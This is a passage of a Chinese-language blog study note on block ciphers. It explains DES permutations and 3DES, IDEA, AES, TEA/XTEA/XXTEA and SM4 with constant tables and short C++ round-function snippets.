class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现S盒中没有大于16的，所以6位经由S盒出来后变为了4位，合并得到新的32位序列</p><h4 id="P盒扩展"><a href="#P盒扩展" class="headerlink" title="P盒扩展"></a>P盒扩展</h4><p>将上面得到的32位序列，按照P盒进行换位，得到A</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> P[<span class="number">32</span>]=&#123;</span><br><span class="line"><span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时第一轮结束，之后R1=L0 XOR A；L1=R0；按照此规律一共进行16次运算</p><p>如果是最后一轮则进行IP逆置换</p><h4 id="IP末置换"><a href="#IP末置换" class="headerlink" title="IP末置换"></a>IP末置换</h4><p>此时左右部分相较于开始没有交换左右，但是内容发生改变，按照如下方式排序得到密文</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> IP_1[<span class="number">64</span>]=&#123;</span><br><span class="line"><span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,</span><br><span class="line"><span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,</span><br><span class="line"><span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,</span><br><span class="line"><span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>解密过程：将64位密文当作明文输入，第一次解密使用K16、第二次K15…以此类推，最后输出得到64位明文</p><p>3DES：包含两密钥和三密钥DES，均是使用三次DES。三密钥即在第三次使用K3主密钥进行解密，其他与两密钥大致无差别</p><p>两密钥DES：主密钥K1对明文加密—主密钥K2对密文进行DES逆运算—主密钥K1再次进行DES加密</p><p>解密：主密钥K1对密文DES逆运算—主密钥K2对密文进行运算—主密钥K1再次进行DES逆运算</p><hr><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><p>对64位的明文块进行加密，密钥长达128位，相同算法可逆。参考<a href="https://blog.csdn.net/qq_40279192/article/details/107420773">国际数据加密算法（IDEA）简介</a></p><h4 id="密钥产生"><a href="#密钥产生" class="headerlink" title="密钥产生"></a>密钥产生</h4><p>密钥长128位；每一轮循环都需要6个子密钥，每个密钥16位，K1、K2…共八轮。每一轮密钥产生规则如下：</p><p>第一轮：按顺序取前16×6位，作为密钥</p><p>第二轮：前一轮用到了96位，因此先取后面的32（16×2）位作为密钥；之后再将密钥向左循环25位，再从前往后取64（16×4）位作为密钥</p><p>第n轮：优先取前一轮未用到的x位作为密钥，之后将整体循环左移25位，再从前向后取（128-x）位作为密钥</p><p>当第八轮的时候，正好使用33-128位，共96位作为密钥，此时还需要进行左移25位，用于最后一步输出变换</p><h4 id="单轮操作"><a href="#单轮操作" class="headerlink" title="单轮操作"></a>单轮操作</h4><p>本步骤需要循环8轮，明文是以64位进行的块加密，我们需要将64位明文分为4组，得到P1、P2、P3、P4；（在这里加乘结果都需要mod $2^{16} +1$ ，下面不在多提）</p><ol><li><p><strong>初始化</strong>：</p><ul><li>将P1与K1相乘得到结果A1，P4与K4同样操作得到A4；</li><li>将P2和K2，P3和K3分别相加得到A2和A3；</li></ul></li><li><p><strong>核心操作</strong>：</p><ol><li>A1与A3进行异或再乘K5：$A1\oplus A3\times K5$</li><li>A2与A4进行异或再加第一步：$A2\oplus A4+Step1$</li><li>第二步结果与K6相乘：$Step2\times K6=\alpha$</li><li>第一步与第三步结果相加：$Step1 + α=β$</li></ol></li><li><p><strong>最后处理</strong>：</p><ul><li>A1、A3与α进行xor得到B1、B3</li><li>A2、A4与第6步进行xor得到B2、B4</li></ul></li><li>进入下一轮</li></ol><h4 id="输出变换"><a href="#输出变换" class="headerlink" title="输出变换"></a>输出变换</h4><p>此时选取密钥的前64位，也就是选取4组，之后对轮换操作的i1、i2、i3、i4进行如下变换：</p><p>i1与K1相乘，i4与K4相乘，i2与K2相乘、i3与K3相乘；</p><p>最终拼接在一起得到密文</p><hr><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>高级加密标准，用来代替DES，AES=Rijndael算法子集。参考<a href="https://www.bilibili.com/video/BV1i341187fK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a14ed599179f7f184401f3073d4efefa">【AES加密算法】</a></p><p>Rijndael算法规定明文和密钥均可变，只需要在[128,256]范围内的且是32的倍数即可；</p><p>下面是一些该算法的前置说明：</p><p>128bit=16Byte，将明文按照从上到下，从左到右对字节进行排序，得到所谓的状态；状态为4行，Nb列（Nb=数据bit总数/32，在128明文时就是4列）；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span></span><br><span class="line"><span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span></span><br><span class="line"><span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span></span><br><span class="line"><span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span></span><br></pre></td></tr></table></figure><p>密钥也可按照上述方法排序，形成4行Nk列；而该算法的<strong>迭代轮数Nr</strong>由<strong>明文列数Nb</strong>和<strong>密钥列数Nk</strong>共同决定</p><div class="table-container"><table><thead><tr><th>Nr</th><th>Nb=4</th><th>Nb=6</th><th>Nb=8</th></tr></thead><tbody><tr><td><strong>Nk=4</strong></td><td>10</td><td>12</td><td>14</td></tr><tr><td><strong>Nk=6</strong></td><td>12</td><td>12</td><td>14</td></tr><tr><td><strong>Nk=8</strong></td><td>14</td><td>14</td><td>14</td></tr></tbody></table></div><p>但是在AES中选定，明文长度分组固定为128位，密钥可选择128、192、256位；为方便说明，下面我们以AES-128为例，整体过程如下：</p><p>明文—初始变换—轮函数（9轮完整）—1轮最终轮—密文</p><p>轮函数包括：字节代换、行位移、列混合（最终轮没有）、轮密钥加</p><h4 id="初始变换"><a href="#初始变换" class="headerlink" title="初始变换"></a>初始变换</h4><p>密钥128位（也可以叫做轮密钥0）和明文128位，按照上述方式进行变换，之后相应位置进行异或操作即可，得到A</p><h4 id="字节代换ByteSub"><a href="#字节代换ByteSub" class="headerlink" title="字节代换ByteSub"></a>字节代换ByteSub</h4><p>即S盒变换，按照字节进行变换，有查表替换和计算两种方式，得到结果相同</p><p><strong>查表替换</strong>：每字节都由两个16进制数表示，拆开看寻找对应格子进行替换</p><div class="table-container"><table><thead><tr><th>x</th><th>00</th><th>01</th><th>02</th><th>03</th><th>04</th><th>05</th><th>06</th><th>07</th><th>08</th><th>09</th><th>0a</th><th>0b</th><th>0c</th><th>0d</th><th>0e</th><th>0f</th></tr></thead><tbody><tr><td><strong>00</strong></td><td>63</td><td>7c</td><td>77</td><td>7b</td><td>f2</td><td>6b</td><td>6f</td><td>c5</td><td>30</td><td>01</td><td>67</td><td>2b</td><td>fe</td><td>d7</td><td>ab</td><td>76</td></tr><tr><td><strong>10</strong></td><td>ca</td><td>82</td><td>c9</td><td>7d</td><td>fa</td><td>59</td><td>47</td><td>f0</td><td>ad</td><td>d4</td><td>a2</td><td>af</td><td>9c</td><td>a4</td><td>72</td><td>c0</td></tr><tr><td><strong>20</strong></td><td>b7</td><td>fd</td><td>93</td><td>26</td><td>36</td><td>3f</td><td>f7</td><td>cc</td><td>34</td><td>a5</td><td>e5</td><td>f1</td><td>71</td><td>d8</td><td>31</td><td>15</td></tr><tr><td><strong>30</strong></td><td>04</td><td>c7</td><td>23</td><td>c3</td><td>18</td><td>96</td><td>05</td><td>9a</td><td>07</td><td>12</td><td>80</td><td>e2</td><td>eb</td><td>27</td><td>b2</td><td>75</td></tr><tr><td><strong>40</strong></td><td>09</td><td>83</td><td>2c</td><td>1a</td><td>1b</td><td>6e</td><td>5a</td><td>a0</td><td>52</td><td>3b</td><td>d6</td><td>b3</td><td>29</td><td>e3</td><td>2f</td><td>84</td></tr><tr><td><strong>50</strong></td><td>53</td><td>d1</td><td>00</td><td>ed</td><td>20</td><td>fc</td><td>b1</td><td>5b</td><td>6a</td><td>cb</td><td>be</td><td>39</td><td>4a</td><td>4c</td><td>58</td><td>cf</td></tr><tr><td><strong>60</strong></td><td>d0</td><td>ef</td><td>aa</td><td>fb</td><td>43</td><td>4d</td><td>33</td><td>85</td><td>45</td><td>f9</td><td>02</td><td>7f</td><td>50</td><td>3c</td><td>9f</td><td>a8</td></tr><tr><td><strong>70</strong></td><td>51</td><td>a3</td><td>40</td><td>8f</td><td>92</td><td>9d</td><td>38</td><td>f5</td><td>bc</td><td>b6</td><td>da</td><td>21</td><td>10</td><td>ff</td><td>f3</td><td>d2</td></tr><tr><td><strong>80</strong></td><td>cd</td><td>0c</td><td>13</td><td>ec</td><td>5f</td><td>97</td><td>44</td><td>17</td><td>c4</td><td>a7</td><td>7e</td><td>3d</td><td>64</td><td>5d</td><td>19</td><td>73</td></tr><tr><td><strong>90</strong></td><td>60</td><td>81</td><td>4f</td><td>dc</td><td>22</td><td>2a</td><td>90</td><td>88</td><td>46</td><td>ee</td><td>b8</td><td>14</td><td>de</td><td>5e</td><td>0b</td><td>db</td></tr><tr><td><strong>a0</strong></td><td>e0</td><td>32</td><td>3a</td><td>0a</td><td>49</td><td>06</td><td>24</td><td>5c</td><td>c2</td><td>d3</td><td>ac</td><td>62</td><td>91</td><td>95</td><td>e4</td><td>79</td></tr><tr><td><strong>b0</strong></td><td>e7</td><td>c8</td><td>37</td><td>6d</td><td>8d</td><td>d5</td><td>4e</td><td>a9</td><td>6c</td><td>56</td><td>f4</td><td>ea</td><td>65</td><td>7a</td><td>ae</td><td>08</td></tr><tr><td><strong>c0</strong></td><td>ba</td><td>78</td><td>25</td><td>2e</td><td>1c</td><td>a6</td><td>b4</td><td>c6</td><td>e8</td><td>dd</td><td>74</td><td>1f</td><td>4b</td><td>bd</td><td>8b</td><td>8a</td></tr><tr><td><strong>d0</strong></td><td>70</td><td>3e</td><td>b5</td><td>66</td><td>48</td><td>03</td><td>f6</td><td>0e</td><td>61</td><td>35</td><td>57</td><td>b9</td><td>86</td><td>c1</td><td>1d</td><td>9e</td></tr><tr><td><strong>e0</strong></td><td>e1</td><td>f8</td><td>98</td><td>11</td><td>69</td><td>d9</td><td>8e</td><td>94</td><td>9b</td><td>1e</td><td>87</td><td>e9</td><td>ce</td><td>55</td><td>28</td><td>df</td></tr><tr><td><strong>f0</strong></td><td>8c</td><td>a1</td><td>89</td><td>0d</td><td>bf</td><td>e6</td><td>42</td><td>68</td><td>41</td><td>99</td><td>2d</td><td>0f</td><td>b0</td><td>54</td><td>bb</td><td>16</td></tr></tbody></table></div><p><strong>计算</strong>：首先将A中每一个字节取mod 256的乘法逆，之后再对每个字节按位与下面矩阵相乘，之后再与下面矩阵进行异或</p><p>$\begin{pmatrix}  1  &amp;0  &amp;0  &amp;0  &amp;1 &amp;1 &amp;1 &amp;1 \\ 1  &amp;1  &amp;0  &amp;0  &amp;0  &amp;1  &amp;1 &amp;1\\  1  &amp;1  &amp;1  &amp;0  &amp;0  &amp;0  &amp;1  &amp;1\\  1  &amp;1  &amp;1  &amp;1  &amp;0  &amp;0  &amp;0  &amp;1\\  1  &amp;1  &amp;1  &amp;1  &amp;1  &amp;0  &amp;0  &amp;0\\  0  &amp;1  &amp;1  &amp;1  &amp;1  &amp;1  &amp;0  &amp;0\\  0  &amp;0  &amp;1  &amp;1  &amp;1  &amp;1  &amp;1  &amp;0\\  0  &amp;0  &amp;0  &amp;1  &amp;1  &amp;1  &amp;1  &amp;1\end{pmatrix} * \begin{pmatrix}x0\\ x1\\ x2\\ x3\\ x4\\ x5\\ x6\\ x7 \end{pmatrix}\oplus \begin{pmatrix} 1\\ 1\\ 0\\ 0\\ 0\\ 1\\ 1\\ 0 \end{pmatrix}$</p><h4 id="行移位ShiftRows"><a href="#行移位ShiftRows" class="headerlink" title="行移位ShiftRows"></a>行移位ShiftRows</h4><p>灰常简单，按照状态行，进行左移；0行不动，1行左移C1字节，2行左移C2字节，3行左移C3字节</p><div class="table-container"><table><thead><tr><th>Nb</th><th>C1</th><th>C2</th><th>C3</th></tr></thead><tbody><tr><td>4</td><td>1</td><td>2</td><td>3</td></tr><tr><td>6</td><td>1</td><td>2</td><td>3</td></tr><tr><td>8</td><td>1</td><td>3</td><td>4</td></tr></tbody></table></div><p>对于AES-128来说就是：0行不动，1行左移1字节，2行左移2字节，3行左移3字节</p><h4 id="列混合MixColumn"><a href="#列混合MixColumn" class="headerlink" title="列混合MixColumn"></a>列混合MixColumn</h4><p>将输入矩阵左乘以如下矩阵，即A · State（注意需要保证在GF(256)上）</p><p>$A=\begin{bmatrix}<br>  02  &amp; 03  &amp; 01  &amp; 01  \\ 01  &amp; 02  &amp; 03  &amp; 01  \\ 01  &amp; 01  &amp; 02  &amp; 03  \\ 03  &amp; 01  &amp; 01  &amp; 02 \end{bmatrix}$</p><p>或者将状态每一列（从上到下）看作：$a\mathop{x}\nolimits^{3} + b\mathop{x}\nolimits^{2}+cx+d$ 并与$03\mathop{x}\nolimits^{3}+01\mathop{x}\nolimits^{2}+01x+02$ 相乘并mod ($\mathop{x}\nolimits^{4}+1$)，注意其中的项数均为16进制</p><h4 id="轮密钥加AddRoundKey"><a href="#轮密钥加AddRoundKey" class="headerlink" title="轮密钥加AddRoundKey"></a>轮密钥加AddRoundKey</h4><p>也灰常简单，将前面得到的4×4的矩阵与轮密钥1、2等进行相应字节的异或即可</p><h4 id="轮密钥生成"><a href="#轮密钥生成" class="headerlink" title="轮密钥生成"></a>轮密钥生成</h4><p>轮密钥生成算法会根据密钥列数Nk而略有不同，Nk&lt;=6（即正好以192位为分界）与Nk&gt;6略有不同。<br>当密钥矩阵为4×4（轮密钥0）时，而且我们需要进行10轮扩展，也就是需要到达轮密钥10，即11×(4×4)，共44列，从左到右标记为$W_0$、$W_1$、$W_2$…$W_i$</p><p>Nk&lt;=6 （以128为例）：<br>当i不是4的倍数时：$W[i]=W[i-4]\oplus W[i-1]$ ；否则：$W[i]=W[i-4]\oplus T(W[i-1])$</p><p><strong>函数T</strong>：</p><ol><li>字循环：一列4字节，向上循环1字节</li><li>字节代换：对上述循环结果使用S盒进行字节代换</li><li><p>轮常量异或：前两步结果与Rcon[ j ]进行三者异或，j表示轮数</p><blockquote><p>$Rcon[j]=\begin{bmatrix}2^{i}\\ 00\\ 00\\ 00 \end{bmatrix}$，注意需要使用16进制</p></blockquote></li></ol><p>Nk&gt;6时：以256为例，此时Nk=8，当i是8的倍数时与上述过程类似，还是进行T函数运算；不是8的倍数，但是4的倍数时，需要进行$ByteSub(W[i-1])$，其余无差别</p><hr><h3 id="TEA系列"><a href="#TEA系列" class="headerlink" title="TEA系列"></a>TEA系列</h3><p>微型加密算法，属于分组加密；使用64位的明文（拆分为x，y）和128位的密钥（Key[4]），建议的迭代轮数为32位，关键标志delta=<strong>0x9E3779B9</strong>，</p><p>每一轮具体加密过程如下，重复32轮，结束之后拼接x、y得到密文：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sum += delta;</span><br><span class="line">x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>解密过程如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//注意这里,sum = 32轮之后的黄金分割值. 因为我们要反序解密.</span></span><br><span class="line"><span class="comment">//总共加密32轮 那么反序也解密32轮</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">   <span class="comment">// 先将y解开 然后参与运算在解x</span></span><br><span class="line">   y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">   x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">   sum -= delta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后该算法被发现有缺陷，于是乎有了其升级版，XTEA和XXTEA</p><p><strong>XTEA</strong>：明文与密钥长度不变，建议轮数仍是32轮，异或运算改变</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)&#123;</span><br><span class="line">x += (((y &lt;&lt; <span class="number">4</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (sum + Key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">sum += delta;</span><br><span class="line">y += (((x &lt;&lt; <span class="number">4</span>) ^ (x &gt;&gt; <span class="number">5</span>)) + x) ^ (sum + Key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>XXTEA</strong>：明文可以是32bit的倍数，没有固定长度v[]，轮数也会依据明文长度n改变(6+52/n轮)；具体流程与上述两者区别较大；下面是每一轮的具体过程（PS：y的初始值为v[n - 1]）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sum += DELTA;  </span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)&#123;  </span><br><span class="line">    x = v[p + <span class="number">1</span>];</span><br><span class="line">    v[p] += (((y&gt;&gt;<span class="number">5</span>^x&lt;&lt;<span class="number">2</span>) + (x&gt;&gt;<span class="number">3</span>^y&lt;&lt;<span class="number">4</span>)) ^ ((sum^x) + (Key[(p&amp;<span class="number">3</span>)^e] ^ y)));</span><br><span class="line">    y = v[p];  </span><br><span class="line">&#125;  </span><br><span class="line">x = v[<span class="number">0</span>]; </span><br><span class="line">v[n<span class="number">-1</span>] += (((y&gt;&gt;<span class="number">5</span>^x&lt;&lt;<span class="number">2</span>) + (x&gt;&gt;<span class="number">3</span>^y&lt;&lt;<span class="number">4</span>)) ^ ((sum^x) + (Key[(p&amp;<span class="number">3</span>)^e] ^ y)));  </span><br><span class="line">y = v[n<span class="number">-1</span>];  </span><br></pre></td></tr></table></figure><hr><h3 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h3><p>也叫SMS4分组算法，数据分组128bit，密钥也是128bit，加密算法与密钥扩展算法都采用32轮迭代。是对合运算（加密解密算法相同，只是轮密钥使用顺序相反），以1字节和1字（这里32bit）。参考<a href="https://www.cnblogs.com/kentle/p/14135865.html">SM4加密算法原理和简单实现 - kentle</a></p><p>大致过程如下所示：</p><p>明文输入四个字$(X_{0},X_{1},X_{2},X_{3})$，轮密钥$rk_{i}$，其中$i$代表轮数</p><p>经过32次迭代，得到$(X_{32},X_{33},X_{34},X_{35})$，之后在进行反序，并拼接得到密文</p><h4 id="迭代运算"><a href="#迭代运算" class="headerlink" title="迭代运算"></a>迭代运算</h4><p>$X_{i+4}=F(X_{i},X_{i+1},X_{i+2},X_{i+3},rk_{i})=X_{i}\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_{i})$</p><h4 id="合成置换T"><a href="#合成置换T" class="headerlink" title="合成置换T"></a>合成置换T</h4><p>由非线性变换$\tau$和线性变换$L$组成，即$T(X_{1}\oplus X_{2}\oplus X_{3}\oplus rk_{i})=L(\tau (X_{1}\oplus X_{2}\oplus X_{3}\oplus rk_{i}))$</p><p><strong>非线性变换</strong>：</p><p>简单来说就是S盒，将$X_{1}\oplus X_{2}\oplus X_{3}\oplus rk_{i}$结果作为输入，同样的到一个字，即四字节，查找下面S盒进行替换，记得到结果B</p><div class="table-container"><table><thead><tr><th>xx</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>D6</td><td>90</td><td>E9</td><td>FE</td><td>CC</td><td>E1</td><td>3D</td><td>B7</td><td>16</td><td>B6</td><td>14</td><td>C2</td><td>28</td><td>FB</td><td>2C</td><td>05</td></tr><tr><td><strong>1</strong></td><td>2B</td><td>67</td><td>9A</td><td>76</td><td>2A</td><td>BE</td><td>04</td><td>C3</td><td>AA</td><td>44</td><td>13</td><td>26</td><td>49</td><td>86</td><td>06</td><td>99</td></tr><tr><td><strong>2</strong></td><td>9C</td><td>42</td><td>50</td><td>F4</td><td>91</td><td>EF</td><td>98</td><td>7A</td><td>33</td><td>54</td><td>0B</td><td>43</td><td>ED</td><td>CF</td><td>AC</td><td>62</td></tr><tr><td><strong>3</strong></td><td>E4</td><td>B3</td><td>1C</td><td>A9</td><td>C9</td><td>08</td><td>E8</td><td>95</td><td>80</td><td>DF</td><td>94</td><td>FA</td><td>75</td><td>8F</td><td>3F</td><td>A6</td></tr><tr><td><strong>4</strong></td><td>47</td><td>07</td><td>A7</td><td>FC</td><td>F3</td><td>73</td><td>17</td><td>BA</td><td>83</td><td>59</td><td>3C</td><td>19</td><td>E6</td><td>85</td><td>4F</td><td>A8</td></tr><tr><td><strong>5</strong></td><td>68</td><td>6B</td><td>81</td><td>B2</td><td>71</td><td>64</td><td>DA</td><td>8B</td><td>F8</td><td>EB</td><td>0F</td><td>4B</td><td>70</td><td>56</td><td>9D</td><td>35</td></tr><tr><td><strong>6</strong></td><td>1E</td><td>24</td><td>0E</td><td>5E</td><td>63</td><td>58</td><td>D1</td><td>A2</td><td>25</td><td>22</td><td>7C</td><td>3B</td><td>01</td><td>21</td><td>78</td><td>87</td></tr><tr><td><strong>7</strong></td><td>D4</td><td>00</td><td>46</td><td>57</td><td>9F</td><td>D3</td><td>27</td><td>52</td><td>4C</td><td>36</td><td>02</td><td>E7</td><td>A0</td><td>C4</td><td>C8</td><td>9E</td></tr><tr><td><strong>8</strong></td><td>EA</td><td>BF</td><td>8A</td><td>D2</td><td>40</td><td>C7</td><td>38</td><td>B5</td><td>A3</td><td>F7</td><td>F2</td><td>CE</td><td>F9</td><td>61</td><td>15</td><td>A1</td></tr><tr><td><strong>9</strong></td><td>E0</td><td>AE</td><td>5D</td><td>A4</td><td>9B</td><td>34</td><td>1A</td><td>55</td><td>AD</td><td>93</td><td>32</td><td>30</td><td>F5</td><td>8C</td><td>B1</td><td>E3</td></tr><tr><td><strong>a</strong></td><td>1D</td><td>F6</td><td>E2</td><td>2E</td><td>82</td><td>66</td><td>CA</td><td>60</td><td>C0</td><td>29</td><td>23</td><td>AB</td><td>0D</td><td>53</td><td>4E</td><td>6F</td></tr><tr><td><strong>b</strong></td><td>D5</td><td>DB</td><td>37</td><td>45</td><td>DE</td><td>FD</td><td>8E</td><td>2F</td><td>03</td><td>FF</td><td>6A</td><td>72</td><td>6D</td><td>6C</td><td>5B</td><td>51</td></tr><tr><td><strong>c</strong></td><td>8D</td><td>1B</td><td>AF</td><td>92</td><td>BB</td><td>DD</td><td>BC</td><td>7F</td><td>11</td><td>D9</td><td>5C</td><td>41</td><td>1F</td><td>10</td><td>5A</td><td>D8</td></tr><tr><td><strong>d</strong></td><td>0A</td><td>C1</td><td>31</td><td>88</td><td>A5</td><td>CD</td><td>7B</td><td>BD</td><td>2D</td><td>74</td><td>D0</td><td>12</td><td>B8</td><td>E5</td><td>B4</td><td>B0</td></tr><tr><td><strong>e</strong></td><td>89</td><td>69</td><td>97</td><td>4A</td><td>0C</td><td>96</td><td>77</td><td>7E</td><td>65</td><td>B9</td><td>F1</td><td>09</td><td>C5</td><td>6E</td><td>C6</td><td>84</td></tr><tr><td><strong>f</strong></td><td>18</td><td>F0</td><td>7D</td><td>EC</td><td>3A</td><td>DC</td><td>4D</td><td>20</td><td>79</td><td>EE</td><td>5F</td><td>3E</td><td>D7</td><td>CB</td><td>39</td><td>48</td></tr></tbody></table></div><p><strong>线性变换</strong>：对B分别进行左移2、10、18、24位，之后五者再进行异或</p><p>$L(B)=B\oplus (B&lt;&lt;&lt;2)\oplus (B&lt;&lt;&lt;10)\oplus (B&lt;&lt;&lt;18)\oplus (B&lt;&lt;&lt;24)$</p><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p>大致过程如下：</p><p>将输入的128位密钥换为$(MK_{0},MK_{1},MK_{2},MK_{3})$，再对其进行扩展，即将每项分别异或$(FK_{0}=A3B1BAC6,FK_{1}=56AA3350,FK_{2}=677D9191,FK_{3}=B27022DC)$</p><p>将其结果记为$(K_{0},K_{1},K_{2},K_{3})$，之后可以得到轮密钥，计算过程如下（$CK$为常数）</p><p>$rk_{i}=K_{i+4}=K_{i}\oplus T’(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_{i})$</p><p><strong>$T’$函数</strong>：与前面的函数基本类似，但是线性变换不一样，改为如下方式<br>$L’(B)=B\oplus (B&lt;&lt;&lt;13)\oplus (B&lt;&lt;&lt;23)$</p><p><strong>CK常数</strong>：$ck_{i,j}$是$CK_{i}$的第$j$个字节，即$CK_{i}=(ck_{i,0},ck_{i,1},ck_{i,2},ck_{i,3})$，且$ck_{i,j}=(4i+j)\times 7(\bmod 256)$，具体值如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> CK[<span class="number">32</span>]=&#123;</span><br><span class="line"><span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span 